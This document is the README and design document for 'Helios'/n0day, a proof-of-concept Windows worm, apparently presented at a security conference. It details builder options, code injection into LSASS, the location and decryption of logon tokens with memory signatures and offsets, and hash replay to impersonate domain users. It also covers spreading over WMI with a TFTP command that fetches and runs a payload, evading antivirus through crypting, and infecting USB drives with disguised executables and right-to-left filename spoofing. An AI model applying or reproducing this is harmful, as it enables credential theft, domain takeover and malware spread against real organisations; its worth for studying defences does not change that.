# Helios
A Proof-of-Concept win32 worm that makes use of netbios session token replay to propagate through a Windows Domain

# Disclaimer
Please note that this work is entirely designed for research purposes, and was presented during the DEFCON security conference. Certain source code was disabled to prevent misuse. This project is entirely for EDUCATIONAL PURPOSES ONLY. Do not consult me on how to build it, as you should not even be looking at this. Thank You.

# Main Documentation for Helios

1      :Abstract
2        |-Feature summary

3      :Building and Input
4        |-Builder parameters
5        |-Builder output
6        |-URL List format

7      :Local Propagation
8        |-Binary structure
9        |-Injection
10       |-x86 to x64 Injection
11       |-Process Synchronization

12     :Network Discovery
13       |-Passive network scanner
14       |-Dynamic URL detection

15     :Payload
16       |-URL List updating
17       |-Gateway cycling

18     :Intranet Propagation
19        |-Hash Replay
20             |-Algorithm
21             |-NT6.0+ and NT5 Differences
22         |-WMI
23         |-tftp
24         |-Token structures
25             |-NT6.0+ Decryption
26             |-Token Decryption

27      :USB Propagation
28         |-PE Infector
29         |-Wrapper Overview
30             |-
31             |-Binary Structure
32             |-RTO, datetime and extension mangling

33      :Wrapper Spearphishing Tool
34         |-Command Line
35         |-Packing

## Release Version: 1.0.0

..* add WEBDAV stuff in Product description
..* remake TOC
..* scan_net() must not return after subnet is exhausted
..* randomize ICMP payload
..* Spoof ICMP source 


## Abstract

    
    In response to the evident awakening of the software security industry, 
    the cost of classic software exploitation has risen significantly. 
        
    A new trend has emerged in the last few years that aims to solve the
    problems associated with the difficulty of fuzzing: architecture exploitation.
    The influx in consumer demand of this form of exploitation is obvious:
    USB drives that drop SCADA payloads, rootkits which hide between
    filesystems and fake Windows Update servers are all examples.

    0x41, designers of the Keres software suite, present the n0day worming
    engine - crafted for the penetration of corporate and military networks.
    n0day propagates through Windows Active Directory (AD) domains by 
    exploiting the Local Security Authority (LSA) subsystem's logon sessions.   
    
    When released on a domain client, n0day will inject code into the LSASS
    process and begin targetting global catalogue Domain Controllers (DCs).                         
    
    As a secondary attack vector, n0day presents a unique technique: the 
    infection of USB drives without copying any binary payload.

    n0day was built as a part of Corona, so it requires a gateway system
    to interface with.
    



## Abstract
### Feature Summary

    n0day general features. Please refer to [5a] for details on attack vectors.

Systems Support:
    ..* x86 Support (x64 is planned on next release)
    ..* Tested on Windows XP (all SPs), Vista, Windows 7 
    ..* MS Server OS support: Server 2003, Server 2008, Server 2008 R2

Local Presence:
    ..* Nothing written to the disks
    ..* Stealth DLL injection into any process 

Network Presence:
    ..* Silent and passive network scanner
    ..* Propagation via TFTP
    ..* Optimized to target Domain Controllers (DCs)

Security:
    ..* Test for process tampering in memory 
    ..* Gateway URL list encryption

Vectors:
    ..* LSA Token Manipulation (nTM)
    ..* Silent USB infection

## Building and Input

    The n0day builder (n0day.builder.exe) generates a PE executable which contains
a dropper, gateway configuration segment and the worming DLL. The gateway 
configuration specifies the attack ID, campaign ID and a list of URLs containing 
qualified gateway addresses. Once the executable is built, the builder outputs 
information required for the identification of the worm instance. The output binary 
is layered in this format:


    [dropper[DLL[config]]]


For instance, the DLL (core) is appended by copying its raw image into the last
segment of the dropper. The builder encrypts the configuration segment and appends 
it to the core DLL in the same
way.

### Builder Parameters

    The builder reads parameters statically, so the parameters cannot be 
mismatched. The builder also requires that each parameter be present.


Parameters:

    -u      Specifies the file containing the Gateway URL list. (String)
                When the worm replicates to a new system using Token
                Manipulation, the payload is downloaded from one of 
                the Gateways specified in this list.

    -d      Specifies the file containing the WEBDAV URL list. (String)
                When the worm generates a .lnk file inside the USB 
                drive, it will use the Gateways specified by the 
                list as WEBDAV hosts.

    -a      Attack ID (Integer)
                Allows the worm code to communicate with the Gateways 
                specified by the Gateway URL list.

    -w      Campaign ID (Integer)
                Allows the worm code to communicate with the Gateways 
                specified by the Gateway URL list.

    -o      Output binary (String)
                The output binary will be stored to the location specified.

    -1      Enables nTM (Boolean)
    -2      Enables all USB Ops (Boolean)
                (NOTE: Either 1 or 2 must enabled)
    -3      Enables the Autorun generator (Boolean)
    -4      Enables the date appender in the USB Wrapper (Boolean)
    -5      Enables RTO
    -6      Enables the Wrapper
    -7      Enables the PE Infector
                (NOTE: Either 3, 6 or 7 must be enabled)

    -i      PE Infector Switch (Integer)
                If 0, the PE infector is completely disabled.
                An integer between 1-100 is the percentage (or likeliness) 
                    that the PE infector will target a file.
                    (1 means 1/100 chance, and 100 means always infect)

    -r      Wrapper Infector Switch (Integer)
                If 0, the Wrapper is completely disabled.
                An integer between 1-100 is the percentage (or likeliness)
                    that the Wrapper will infect a document.
                    (1 means 1/100 chance, and 100 means always infect)

    -t      Any USB file accessed after n amount of days will be ignored.
                This includes PEs and Documents
                If 0, every file will be infected.

    -p      The likeliness that a .PIF extension will be used instead 
                of the regular .exe
                (0 means PIF will never be used, 100 means PIF will
                always be used)

Example:

```
builder.exe -u gateway_list.txt
            -d webdav_list.txt
            -a 666
            -w 777
            -o dropper.exe
            -1 1                        (nTM Enabled)
            -2 1                        (USB Ops enabled)
            -3 1                        (Will install autorun.inf in the USB)
            -4 0                        (Will not append the date in the wrapped USB File)
            -5 1                        (Enables RTO)
            -6 1                        (Enables the Wrapper)
            -7 1                        (Enables the PE infector)
            -i 50                       (PE infector infects every other file)
            -r 75                       (3/4th of the Docs are wrapped)
            -t 30                       (Only documents accessed within the last 30 days are noticed)
            -p 50                       (Half/half chance that the .PIF extension will be used)
```            


    As noted before, the parameters must be in order. Each parameter must exist. 
Finally, the Gateway URL (-u) and WEBDAV URL lists can be the same file.

    There parameters will be passed down to the USB infector and wrapper mechanisms.
The DLLs will need to be rebuilt once a new combination of these options is needed.

### Builder Output
    
    Before the a payload from the Gateway is requested, a URL must be generated 
which specifies the worm checksum. This checksum looks for any modifications in 
the code or data that may signify a hijacking attempt. In order for the output 
to succeed, each file distributed with the n0day worm must be in one directory. 

An ASCII string containing a SHA-1 checksum will be output upon successful execution.

For example:

    ```sum: 484455183745fc5561ed7fd91db1c704958e568f```


### URL List Format

    This section applies to both the Gateway URL list and the WEBDAV URL list. 
The text file should be in plaintext, encoded using standard ASCII symbols. If the 
list is malformed, crashes will definitely occur.

Example URLs:

http://www.google.com:80/gateway/
http://10.0.0.1:8080/

    ..* "http://" must always be specified
    ..* Domain must not include a sub-subdomain (aka a.www.b.com)
    ..* Port must always be specified
    ..* The trailing "/" must be included
    ..* Do not include an extra carriage return after the last entry
    
    
    Webdav List format
    
http://webdav-server/folder/file.exe

    [+] "http://" must be specified
    [+] Do not include the port number (predefined for WebDAV)
    [+] Specify the file name and extension
    
## Local Propagation

    The built binary should be executed as UAC administrator for maximum 
effectiveness. The dropper code will extract the core DLL from the 
last segment and map it into memory. Execution is passed to InitializeDll(...)
and the DLL starts its interprocess infection subroutine.

    If ASLR is active on the target process, the injected DLL will determine
if its IAT was properly resolved. If there is an unresolved function, the DLL
find its base address and IAT and resolve the required functions by crawling
the DLLs export table.

    The local DLL injector can be configured to propagate into every process
on the system. The default n0day configuration is configured for Keres Gateway 
interaction, so injection into lsass.exe is only required. 

    If the n0day core DLL detects its host process as LSASS, the thread 
dispatcher will take the following actions:
    

    1. Call initialize_debug_channel (DEBUG ONLY)

    2. Allocate memory for the shared ip_address_list buffer
    3. Start scan_net() thread used to discover hosts on the network
    
    4. Create the mutex used to synchronize communication with the husk process
        (explained in 5). The mutex is released immediately.
    5. The fetch_payload() thread is started, which attempts to communicate
        with the gateways in order to fetch the newest dropper payload.
        The LSASS DLL waits until at least one payload is fetched.
        If no gateway is reached, the LSASS DLL waits INFINITE.
    
    6. The LSASS DLL determines if it is running on a Domain Controller (DC).
        
    7. The LSASS DLL creates a mutex used for synchronization between the 
        TFTPd and n0day Token Manipulator (nTM) engine.

    8. The local OS is determined by the LSASS DLL
        If we are running in NT5.x, then lsass_procedure5() is called.
        If we are running in NT6.0+, then lsass_procedure() is called.


    If n0day does not run in LSASS, it will call replicate_dll_thread()
which will attempt to inject into the target processes.
    
## Network Discovery

    If code is injected into LSASS, the DLL starts the scan_net() thread. 
scan_net will update ip_address_list, that is read by get_random_address_from_pool(...).
The scan_net() thread performs a steath ICMP scan on the entire subnet using 
functions available in ring 3.

Here is the basic function call and thread map:

```                     
         thread_dispatcher()
                 |
  --------------------------------
  |                              |
lsass(5)_procedure()        scan_net()
  |                              |
  |                              |
get_rand_address()            update
      |                          |  
      |                          |
      ---------mutex--------------
                 |
      (PDWORD)ip_address_list
```


    scan_net() threads begins by allocating memory for the used_address_pool,
that will be used for storing IP addresses that were determined earlier. Next,
the local network adapter is determined and the subnet length calculated.
The correct adapter is verified by checking proper gateway, IP address and
MIB_IF_TYPE_ETHERNET field.

    scan_net() initializes the CRITICAL_SECTION responsible for synchronization
between the scan_net() updating subroutine and get_random_address_from_pool(...)
function, called by lsass(5)_procedure() thread. 

    The main loop is started, and each IP address in the subnet is sent an
ICMP packet containing the payload:

char request_data[] = "ger8gje9r8dfughdoiuhg";

    A call is made to IcmpSendEcho2Ex(...) to send the ICMP payload with 
a spoofed source address. The ARP cache is checked via GetIpNetTable(...)
and the new addresses are filtered into ip_address_list.

    Using ARP caching for determining networked neighbours is useful because
addresses that are not pinged by the scanner are stored in the cache. There is 
a small delay between calls to IcmpSendEcho2Ex(...), so the average time it 
takes to scan a class C network (253) hosts is approximately 1-3 minutes.   

## Payload

    n0day does not contain any payload, nor does it write anything to the disks.
If n0day gains control of the local machine (SYSTEM authority), it will create a 
thread which will attempt to contact the gateways specified by the Gateway URL List.
The payload updating thread will halt all worming processes until a Gateway is 
reached. Furthermore, n0day will cycle the gateway list so that each URL is tested. 

    Once a gateway is reached, the updater thread will signal the DLL, which
will begin worming.

    The Gateway URL list and WEBDAV URL list specified in the builder options is 
encrypted and stored as data in the last segment of the core DLL. The last segment
prior to encryption is given:

```
[Offset]        [Data]
0               (DWORD) Key
4               (DWORD) Attack ID
8               (DWORD) Campaign ID
0c              (...)
```

    At 0c, the Gateway URL exists, seperated by carriage return and new line bytes.
The list follows a NULL, followed by the WEBDAV URL list, written in the same way.

    The encryption algorithm is a basic XOR & bit shift, using a 32-bit Key.
    
    
------------------------------------------------------------------------------------
                                    
                                    
    The n0day payload updater reaches the Gateway server through the list specified
in the builder. Let's say for example that the Gateway script exists on 
http://google.com:80/gateway. The payload updater will generate a link similar
to this:

    http://google.com:80/gateway/gate.php?a=$attack_id&w=$campaign_id&c=$sha1sum
    
## Intranet Propagation

    The n0day worm is designed to attack critical machines on a Microsoft
domain infrastructure. The n0day Token Manipulation (nTM) technique is not 
any sort of typical exploit code (utilizing process exploitation). Instead, it
reaps reward from the shakey Microsoft AD User Session architecture.

    Contemporary Microsoft domains use either NTLMv2 or Kerberos to 
allow a client to authenticate with the DC. If a user logs into a Windows client, 
his password is hashed and sent to the DC that verifies the credentials. 
This communication is relatively secure (especially with Kerberos), so grabbing
hashes from network chatter becomes increasingly difficult. 

    Upon successful logon, the LSA creates an access token representing the
that session. explorer.exe will inherit those credentials, and allow the user 
to access network resources without having to log in again. The tokens reside
in memory while the session remains active. Sessions are created when a user logs
into a local system, a user attempts to "run as..." another user, or when a user 
logs into a machine via RDP. There are other means also, for instance, database
or application communication.

    These tokens contain the "key" to user impersonation. Essentially, a user
can be impersonated without any password or username. The nTM technique exploits
this Microsoft "feature" to propagate through the network.

## Hash Replay (n0day Token Manipulator - nTM)

    Once the n0day DLL is loaded into lsass.exe, it attempts to locate all
existing logon/session tokens. The nTM engine replays hashes by creating a
"husk" process with dummy credentials. Usually, this will fail considering
the process cannot start without proper credentials. However, this is not the 
case! The husk is started with the user and domain credentials of a real
user, so nTM is using a *real* username and domain. nTM must use a dummy
password and search for the hashed password in memory. So windows will create
a token with the correct user, domain and session of the impersonated token, 
but with an incorrect NTLM. 

```
CreateProcessWithLogonW(    real_token.user,            // This user exists
                            real_token.domain,          // The domain is correct
                            L"dummy_password",          // Password is wrong
                            LOGON_NETCREDENTIALS_ONLY,  // Creates a new token
                            NULL,
                            L"C:\\windows\\system32\\cmd.exe",
                            CREATE_SUSPENDED,           // Must be suspended
                            NULL,
                            NULL,
                            &startup_info,
                            &process_info)
```                            
                            
If `L"dummy_password"` is `694f128428be20229cfd00186281a34a`, for example, then nTM
will look for that hash and determine that this is the token it must inject into.
Just to note, the password specified is always converted into wchar_t (Wide 
characters, 2 bytes per) before calling the NTLM hashing subroutine.

    The husk process does not have any rights to any resource until the NTLM
field in the token is adjusted. Once the NTLM is ready, the token must be 
configured for network logins. Once all modifications are made, the husk token
is resumed under the credentials of an impersonated (and valid) user!

    If a domain administrator logs into the client machine, the logon token
will remain active and nTM will attempt to replicate it into a husk process. If 
this is successful, nTM will be granted full control over the domain! Of course,
n0day is built to be domain aware, so it will know if it is on a client or DC. 
If it is true for the latter, n0day will drop all TFTP and WMI port filtering
on each machine. A network wide spread will then occur.

                                    ***
                                    
    When a token in LSASS memory is found, it is decypted and stored into the
`NTLM_TOKEN` structure.

```
typedef struct ntlm_token {
    DWORD               *raw_token; 
    DWORD               *decrypted_token;
    char                *primary_string;
    BYTE                *ntlm;
    BYTE                *session;
    wchar_t             *domain;
    wchar_t             *user;
    HANDLE              heap;
    DWORD               *original_decrypted_token;
} NTLM_TOKEN, *PNTLM_TOKEN;
```

    Each NTLM_TOKEN instance exists in its own heap space. sizeof(NTLM_TOKEN) is 
zero'd and the NTLM_TOKEN.heap field is pointed to the structure heap. 
NTLM_TOKEN.raw_token points to the original encrypted token.
NTLM_TOKEN.primary_string points to the 'Primary' string (refer to [5f]).
The ntlm, session, domain and user variables all point to the decrypted_token,
which is mapped by the NTLM_TOKEN.heap handle.

## Algorithm

    nTM is optimized for session hijacking. It will also prefer to target
domain controllers. Obviously, access to a domain controller is golden, so more 
client infections will occur to increase n0day's chances of obtaining a 
worthwhile token.


The nTM Algorithm

0.  Determine our host OS. NT5.0 and NT6.0+ procedures differ substantially.
1.  Drop local UDP/69 for TFTPd

2.  Target Loop.
2.0     A target machine on any subnet is taken from the ip_address_list.
        nTM will alternate between a client machine and a DC. This will
        increase chances of gaining access to a DC. Since this is our 
        first iteration, the domain global catalogue DC is selected.

2.1 Token Loop. 
2.2     All existing tokens in LSASS heap memory are enumerated into 
        NTLM_TOKEN structures.

2.3     "Used" real tokens are removed from the list if they contain a 
        session & NTLM hash that was previously used. This will also filter
        used husk tokens.

2.4     A random token is selected from LSASS heap memory and is used as the
        real_token. 

2.5     A husk process (cmd.exe) is created suspended with incorrect dummy 
        credentials. nTM uses the dummy password ntlm hash to determine
        which token belongs to the husk process. The user and domain specified
        by the create process API is copied from the real_token information.

2.6     All LSASS threads are suspended.

2.7     The information obtained from the real_token is then injected into
        the husk token.

2.8     All LSASS threads are resumed

2.9     The husk process (cmd.exe) is resumed. Now the husk token is operating
        under the security rights of the real_token.

2.a     The n0day core DLL is injected into the husk process. husk_entry_point
        is called which waits for a GO signal from LSASS DLL. Once the nTM engine
        has completed its work, it signals the husk to begin infection of the 
        remote system. (explained in detail at the end of the section)

2.b     nTM, residing in LSASS, waits for the husk process. The husk will report
        back to nTM with a SUCCESS or FAILURE. SUCCESS signifies that the 
        real_token has complete access to the remote machine. It also implies that
        the remote machine was infected. If this was the case, nTM will reuse this
        real_token and attempt to target the domain controller. If that fails, nTM
        will target other machines with the same token. If this also fails, a new 
        token and target machine will be selected (loop back to 2). If there is an 
        immediate failure reported, a new hash will be selected and tried on the
        same target (loop back to 2.1).

2.c     The husk token is terminated and a loop is made to either 2 or 2.1.

    Note that if the husk process returns a SUCCESS, it will wait instead of exit.
Any new targets will be passed the the husk to continue attacks as the impersonated
user.

    Once a machine is infected, nTM will store that machine's IP in a buffer. 
nTM will continue working on uninfected machines, while accumulating additional 
IP addesses from the passive scanner. This will ensure that the worm will work
until all machines have been infected. If the tokens that exist on the system are
of limited permissions, nTM will keep trying until access is granted.

## NT6.0+ and NT5 Differences
    
    The same algorithm is taken by both OSs, but there are a few differences between
Windows XP and Windows 7 token storage. nTM finds the encrypted tokens by searching
all pages with the MEM_COMMIT and MEM_PRIVATE switches. Real tokens are found by 
searching for the 'Primary' signature, which must be referenced by another value.

    Windows XP implements a DES-X block encryptor with CBC cipher chaining to hide
the presence of the token object. LsaInitializeProtectedMemory(...) generates a DES-X
hints table, which is then stored in heap memory. Token objects are decrypted using a 
call to LsaEncryptMemory(...), in lsasrv.dll. This function will access the hint tables
and decrypt a block of memory. 

`LsaEncryptMemory` prototype and signature

```
void (WINAPI *LsaEncryptMemory)(unsigned int *, // Pointer to buffer
                                unsigned int,   // Size of buffer
                                unsigned int)   // Mode. 1=encrypt, 0=decrypt
                                = NULL;
                                
.text:7573FDEC 000 8B FF                   mov     edi, edi
.text:7573FDEE 000 55                      push    ebp
.text:7573FDEF 004 8B EC                   mov     ebp, esp
.text:7573FDF1 004 81 EC 10 01 00 00       sub     esp, 110h
.text:7573FDF7 114 A1 58 01 7D 75          mov     eax, ___security_cookie
.text:7573FDFC 114 56                      push    esi
.text:7573FDFD 118 8B 75 08                mov     esi, [ebp+arg_0]
.text:7573FE00 118 85 F6                   test    esi, esi
.text:7573FE02 118 89 45 FC                mov     [ebp+var_4]
```

    In XP, the LsaEncryptMemory function is identified in memory through the function
prologue. Utilizing this function allows nTM to decrypt/encrypt any token in memory.

    NT6.0+ is much to the same effect, except for varying offsets in the tokens. The
bcrypt library is instead used by LSA to perform encryption on tokens. All tokens in
LSA are encrypted using the same key, generated using the same secret. nTM finds the 
secret in lsasrv heap memory and generates a symmetric DESX-CBC key from it. The keys
are then used to perform encryption on the tokens.

    Furthermore, Windows XP uses the Advapi32.dll exports LogonUser(...) and 
`CreateProcessAsUser(...)` to create the husk process. 

```
LogonUser(  real_token.user,
            real_token.domain,
            PLAINTEXT_PASS,
            LOGON32_LOGON_NEW_CREDENTIALS,
            LOGON32_PROVIDER_DEFAULT,
            &token);
            
CreateProcessAsUser(    token,
                        NULL,
                        L"C:\\WINDOWS\\system32\\cmd.exe",
                        NULL,
                        NULL,
                        FALSE,
                        CREATE_SUSPENDED,
                        NULL,
                        NULL,
                        &startup_info,
                        &process_info);
```                        
                        
    nTM running on Vista+ calls `CreateProcessWithLogon(...)`, which is a more flexible
function but does the same thing.

## WMI & TFTP

    When the husk process recieves a GO from nTM to begin infection, it reads a registry 
key (specified in n0day.core.dll main.h) which contains an IP address of the remote machine.

The husk follows this procedure:

    =>  Initialize the ole32 library 
    
    =>  Create a server instance
    
    =>  Connect to the remote namespace (target machine)
            If there is a failure, then the husk does not have access to the remote machine.
            If there is a success, then the husk has gained complete access to the machine.
            
    =>  Sets security permissions on the services object, notifying LSA that the WMI instance
        has RPC_C_IMP_LEVEL_IMPERSONATE set.
        
    =>  Determine the remote OS.
            If it is Vista+, then the tftp client wont exist by default. Use WMI 
            to install the MSI through pkgmgr. Unfortunately, this process could 
            take a few          minutes.
    
    =>  The husk process starts the local TFTP daemon thread. 
            Synchronization between the TFTP daemon thread and the husk process is 
            maintained  through a CRITICAL_SECTION object.
            
            The daemon first opens a mutex, which is owned by the payload downloader 
            thread in LSASS. The payload downloader thread obtains this mutex once 
            an update occurs. When the TFTPd thread gets a handle to the mutex, 
            it attempts to open a shared memory region, which will link the LSASS
            nTM thread and the husk subprocess. The TFTPd will now have the latest
            payload.
    
    =>  The TFTP command is executed through WMI.
    
            tftp -i 1.1.1.1 GET abcde12345 C:\random_name.exe
            
            'abcde12345' is required for the download to start.
            
    =>  The payload will be executed through WMI and the husk will return SUCCESS.
            The target machine is marked as infected.

## Token Structures

    The Local Security Authority Subsystem Service (LSASS) was rigerously reversed
to determine how the process handles token creation, validation and removal.

    Each token that exists in LSA memory must be encrypted, so first we must find 
where the encrypted pool is. The DESX-CBC keys will change upon reboot. However, 
Windows leaves us with some excellent signatures that will find an encrypted token.
First, nTM looks for an ASCII string 'Primary' followed by NULL, in LSASS memory.
There are many instances, some will not be a token. 


Example encrypted token

```
[Address]   [Data]          [Offset]        [Notes]
0x00230000  0c 00 23 00     0               Contains a pointer to 'Primary'
0x00230004  0f a2 00 00     4           
0x00230008  01 00 ff ff     8
0x0023000c  50 72 69 6d     12              'Prim'
0x00230010  61 72 79 00     16              'ary',0
0x00230014  xx xx xx xx     20              Everything below this is encrypted
0x00230018  xx xx xx xx     24
0x0023001c  xx xx xx xx     28
0x00230020  xx xx xx xx     32
```


    At offset 0, we have a DWORD which is an address, 0x0023000c. This address 
points to the 'Primary' string. These two conditions imply that at 0x00230014
we have an encrypted token. The encrypted buffer after the 'Primary' string 
contains sensitive session information, it is 0x70 in size.

    
    
                                    ***


                                    
    If the local machine is Windows XP, then a call to `LsaEncryptMemory(...)` is 
sufficient to decrypt the token. In Windows Vista+, the bcrypt library creates 
handles to its symmetric keys, which will be difficult to locate. Fortunately,
Microsoft keeps the secret, a 24-byte value, which can be used to generate a new
symmetric key, in memory. 

    nTM reads all pages allocated with `MEM_PRIVATE` for a DWORD value of `0x55555552`,
or `RUUU`. Here is an example:

```
004B0000  00000014 0
004B0004  55555552 4    Our initial string, RUUU (0x55555552)
004B0008  0028C2C8 8
004B000C  004B0020 12   This value must point to offset 32 (0x20)
004B0010  00000000 16
004B0014  00000000 20
004B0018  00000000 24
004B001C  00000000 28
004B0020  000001BC 32
004B0024  4D53534B 36
004B0028  00010005 40   This value must be 0x00010005
004B002C  00000001 44
004B0030  00000008 48
004B0034  000000A8 52
004B0038  00000018 56
004B003C  0F27E30C 60   If all above values are true, then this is the secret
004B0040  7CDC1A74 64
004B0044  BDB3B630 68
004B0048  BAF548FC 72
004B004C  D65DD841 76
004B0050  822470E1 80
004B0054  5424C874 84
004B0058  4FC1460A 88
004B005C  1450C4A0 92
```


    In NT6.1, the key is located at 0x3c relative to -0x04 of 'RUUU'. In NT6.0,
the same thing applies except the key is located at 0x2c. In both cases, the
key is 24 bytes in length. The key cannot contain a NULL byte, this is checked by
LSASS.

## NT6.0+ Decryption

    Once nTM has obtained the secret, it must generate a symmetric key and decrypt
the token. BCRYPT_3DES_ALGORITHM is specified in `BCryptOpenAlgorithmProvider(...)`.
The chaining mode, in this case CBC (BCRYPT_CHAIN_MODE_CBC) is applied by calling
`BCryptSetProperty(...)`. 

    Next, a call to `BCryptGenerateSymmetricKey(...)` returns the handle to the 
key object. The Initialization Vector is an 8 byte cryptographic primitive, which 
increases the entropy of the block cipher. Windows zero's this value before calling
`BCryptDecrypt(...)`.

```
BCryptDecrypt(  key_handle,
                (PUCHAR)local_token->raw_token,
                NTLM_TOKEN_6_SIZE,
                NULL,
                iv,
                sizeof(iv),
                (PUCHAR)local_token->decrypted_token,
                NTLM_TOKEN_6_SIZE,
                (PULONG)&junk,
                0); 
```    
    
                
    The result decrypted buffer is stored in local_token->decrypted_token. The
encryption handlers are closed and nTM processes the decrypted token.

## Token Decryption

    n0day identifies several important offsets in the decrypted token:
 
``` 
007B05B8  0D614380  €Ca.    00      Base (after 'Primary')
007B05BC  97AD4B10  K­—     04
007B05C0  00140012  ....    08
007B05C4  00000060  `...    12      Offset to user name
007B05C8  54AC2B04  .+¬T    16      Session hash (16 bytes)
007B05CC  B3A514EE  î.¥³    20
007B05D0  80B5DE4F  OÞµ€    24
007B05D4  BA724A5B  [Jrº    28
007B05D8  00000000  ....    32      NTLM hash (16 bytes)
007B05DC  00000000  ....    36
007B05E0  00000000  ....    40
007B05E4  00000000  ....    44
007B05E8  2BE4A824  $¨ä+    48
007B05EC  A8F30F8B  ‹ó¨.    52
007B05F0  DEBAD772  r×ºÞ    56
007B05F4  A9353879  y85©    60
007B05F8  FA4BE8F6  öèKú    64
007B05FC  00010001  ....    68
007B0600  004F004C  L.O.    72      Offset 72 is always the domain in wchar_t
007B0604  00410043  C.A.    76
007B0608  0044004C  L.D.    80
007B060C  004D004F  O.M.    84
007B0610  00490041  A.I.    88
007B0614  0000004E  N...    92
007B0618  00490057  W.I.    96      Pointed to by the DWORD at offset 12. User name
007B061C  0037004E  N.7.    100
007B0620  00450054  T.E.    104
007B0624  00540053  S.T.    108
007B0628  00000024  $...    112
007B062C  00000000  ....    116
```
    
    In this instance, nTM will notice a zero'd NTLM field. This implies that the 
token is probably a local session, which is unrecognized by the domain authority.
It is sufficient to impersonate a user by modifying the Session and NTLM fields.

    The username and domain name varies per implementation, but generally the 
token cannot exceed 0x70 bytes in size. The user name is always a wchar_t string
pointed by:

`(wchar_t *)((DWORD)decrypted_token + *(PDWORD)((DWORD)decrypted_token + 0x0c))`

## USB Propagation
### PE Infector
#### Wrapper Overview
        
    The Helios Wrapper aims to combine numerous social engineering tricks with
a USB infection vector. Users frequently distribute corporate documents by means 
of removable USB drives. The Wrapper locates these files and "wraps" a PE executable
around them, allowing the Helios worm to spread. The PE itself is a downloader for the 
KR3PE payload.

#### Structure
    
    Since the Wrapper is generating executable PEs, binary encryption must be ensured.
This will be explained in detail later on. Also, the PE must be generated to mimic the 
original document as best as possible. Several tricks have been implemented to achieve 
this goal: icon replication, RTO (explained later) and PIF extensions. The wrapped PE
is made to look as close as possible to the original document.

    Once the PE is executed, the original document payload is decryped and loaded. The
downloader will continue its work while the User can safely modify the document. The 
downloader PE will then attempt to reach a gate via webdav. If a gate is successfully 
reached, the payload will be executed, and the PE will delete itself.

#### Generation procedure
    
    Initially, the CORE32/CORE64 Helios worm DLLs must be generated, specifying the 
gateway lists. Before these DLLs are pushed onto client machines, a wrapper 'skeleton'
must be generated by the panel. The builder used for the skeleton will encode the 
attack and campaign IDs associated with the Corona instance. Furthermore, a list 
containing the webdav servers will also be appended.

    Next, the builder will use the KPCOE crypter on the skeleton, ensuring that the 
binary cannot be detected by AV. Since it is only a matter of time before crypted 
instances are detected, the Corona panel can be instructed to create a new instance
of the skeleton when required.

#### Wrapper Algorithm
    
    Once all binaries are built, Helios may be pushed onto the client systems. Here is
an algorithmic outline of how a file is infected:


    1. CORE32/CORE64 DLLs are loaded into explorer.exe
    
    2. The DLL waits until a USB device is plugged into the system (note:
        the DLL will also look for writable network drives, and any other
        removable media)
        
    3. Once a victim document is found, the DLL attempts to reach a gate
        in order to download the latest skeleton file, initially generated
        by the skeleton builder.
        
    4. Next, the document is removed from the disk and appeneded to the
        skeleton.
        
    5. The document is encrypted.
    
    6. An icon is loaded into the resource segment of the PE, respective to
        the file extension of the document.
        
    7. The PE is written to the disk.
    
    8. RTO is applied to the extension.
    
### RTO
    
    RTO, or the Right-to-left Override trick is a feature of MS Windows that
allows files to be named in Arabic languages. This is especially useful in
malware, because it tricks the user into thinking the executable is of the
expected extension. For instance:

    Original document:      test.pdf
    Original PE:            test.exe
    RTO:                    testexe.pdf
    
    This tricks works on all modern Windows OSs, without the need of an Arabic
or any other non-standard language pack.

ALL WORK IS FOR RESEARCH AND EDUCATIONAL PURPOSES ONLY! stan [dot] ruzin [at] gmail [dot] com
